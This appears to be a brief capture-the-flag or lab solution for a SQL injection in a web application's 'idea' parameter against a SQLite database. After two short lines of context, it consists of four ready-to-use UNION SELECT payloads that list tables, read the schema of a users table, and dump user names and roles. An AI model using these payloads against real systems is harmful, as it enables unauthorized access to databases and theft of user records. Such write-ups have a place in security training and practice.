- after registration you will find sql injection in idea parameter
- after some searching you will find that the database type is sqlite
```
') union select 'zz', (SELECT tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'),'' -- 
```
```
') union select 'zz', (SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name NOT LIKE 'sqlite_%' AND name ='xde43_users'),'' -- 
```
```
') union select 'zz', (SELECT group_concat(name,'~~') from xde43_users),'' -- 
```
```
') union select 'zz', (SELECT group_concat(role,'~~') from xde43_users),'' -- 
```
